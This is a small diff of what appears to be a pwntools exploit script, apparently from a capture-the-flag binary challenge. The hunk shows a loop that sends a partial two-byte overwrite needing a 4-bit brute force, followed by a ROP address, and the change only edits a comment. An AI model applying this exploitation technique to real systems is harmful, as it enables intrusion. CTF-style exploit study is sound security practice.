@@ -54,7 +54,7 @@ while True :
         p.send(pay2)
 
         sleep(0.5)
-        p.send("\x70\xbb") # need bruteforce
+        p.send("\x70\xbb") # 4bit need bruteforce
 
         sleep(0.5)
         p.send(p64(_start)) # rop
